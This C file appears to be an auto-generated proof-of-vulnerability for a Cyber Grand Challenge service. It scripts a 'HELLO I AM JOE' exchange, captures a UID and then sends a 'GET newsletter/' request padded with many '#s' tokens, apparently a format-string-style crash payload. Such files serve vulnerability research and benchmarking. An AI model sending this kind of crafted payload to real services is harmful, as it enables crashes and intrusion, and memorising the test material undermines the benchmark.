#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** variable declaration for uid
      static unsigned char dvar_00000000[] = 
         "\x69\x6e\x76\x61\x6c\x69\x64";
      static unsigned int dvar_00000000_len = 7;
      unsigned char *var_00000 = NULL;
      unsigned int var_00000_len = 0;
      var_00000 = cgc_append_buf(var_00000, &var_00000_len, dvar_00000000, dvar_00000000_len);
      cgc_putenv("uid", var_00000, var_00000_len);
      cgc_free(var_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x48\x45\x4c\x4c\x4f\x20\x49\x20\x41\x4d\x20\x4a\x4f\x45\x0a";
      static unsigned int write_00000_00000_len = 15;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read assign to var "uid" from pcre: HELLO JOE YOUR UID IS ([a-f0-9]+) HOW CAN I HELP YOU\n
      static char read_00000_regex[] = 
         "\x48\x45\x4c\x4c\x4f\x20\x4a\x4f\x45\x20\x59\x4f\x55\x52\x20\x55"
         "\x49\x44\x20\x49\x53\x20\x28\x5b\x61\x2d\x66\x30\x2d\x39\x5d\x2b"
         "\x29\x20\x48\x4f\x57\x20\x43\x41\x4e\x20\x49\x20\x48\x45\x4c\x50"
         "\x20\x59\x4f\x55\x5c\x6e";
      cgc_assign_from_pcre("uid", read_00000, read_00000_len - read_00000_ptr, read_00000_regex, 1);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00001[] = 
         "\x20\x53\x41\x59\x53\x20\x47\x45\x54\x20\x6e\x65\x77\x73\x6c\x65"
         "\x74\x74\x65\x72\x2f\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23"
         "\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23"
         "\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x23\x73\x20\x50\x4c"
         "\x45\x41\x53\x45\x0a";
      static unsigned int write_00001_00001_len = 69;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_var("uid", write_00001, &write_00001_len);
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00001, write_00001_00001_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a\x09\x0a\x09\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x47\x4f\x4f\x44\x42\x59\x45\x0a";
      static unsigned int write_00002_00000_len = 8;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x47\x4f\x4f\x44\x42\x59\x45";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 7);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
}
